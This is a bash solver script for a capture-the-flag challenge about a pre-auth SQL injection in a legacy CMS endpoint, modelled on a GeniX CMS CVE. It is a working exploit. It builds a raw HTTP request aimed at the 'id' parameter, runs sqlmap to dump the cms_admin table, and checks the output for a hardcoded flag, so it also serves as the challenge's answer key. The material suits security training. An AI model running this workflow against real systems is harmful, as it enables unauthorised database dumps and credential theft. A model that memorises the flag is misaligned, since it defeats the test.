#!/usr/bin/env bash
# solvers/p2_2.sh, Task 2.2 "A Sealed Floor" canonical exploit.
#
# This floor models the real-world class of bug behind CVE-2015-3933
# (GeniX CMS): an ancient, unauthenticated content-management endpoint that
# takes a page/module selector plus a record `id` in the URL, and splices
# that `id` straight into a query with no escaping at all. The lesson isn't
# a new SQL technique (see solvers/p2_1.sh for the sqlmap-workflow floor),
# it's that a public CVE advisory names a *pattern* ("legacy CMS, GET
# param, pre-auth SQLi"), and the job is recognizing that pattern in code
# nobody has looked at in years, then confirming it exactly the way you'd
# confirm any other injection: point sqlmap at the parameter and dump.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{an_old_forgotten_door}"

# Strip scheme; keep host[:port] verbatim for the request file's Host header.
HOST="${BASE#http://}"
HOST="${HOST#https://}"

WORKDIR=$(mktemp -d)
REQ="${WORKDIR}/req.txt"
OUTDIR="${WORKDIR}/sqlmap-out"
LOG="${WORKDIR}/sqlmap.log"
trap 'rm -rf "$WORKDIR"' EXIT

cat > "$REQ" <<EOF
GET /p2/sealed?page=news&id=1 HTTP/1.1
Host: ${HOST}
User-Agent: seiyaku-arc-solver
Accept: */*
Connection: close

EOF

echo "[p2_2] saved raw request to ${REQ}:"
sed 's/^/  | /' "$REQ"

echo "[p2_2] running: sqlmap -r req.txt -p id --batch --dump -T cms_admin"
# --ignore-stdin: same non-interactive gotcha as p2_1, without it, a
# closed/non-tty stdin races -r's request file as a second target source
# and sqlmap exits having scanned nothing. See solvers/p2_1.sh for the
# full explanation.
sqlmap -r "$REQ" -p id --batch --ignore-stdin --dump -T cms_admin \
    --output-dir="$OUTDIR" 2>&1 | tee "$LOG"

if grep -qF "$FLAG" "$LOG" || grep -rqF "$FLAG" "$OUTDIR" 2>/dev/null; then
    echo "[p2_2] ok: flag recovered from sqlmap's dump of cms_admin: ${FLAG}"
    echo "[p2_2] PASS"
    exit 0
else
    echo "[p2_2] FAIL: flag not found in sqlmap output or dump files"
    echo "[p2_2] FAIL"
    exit 1
fi
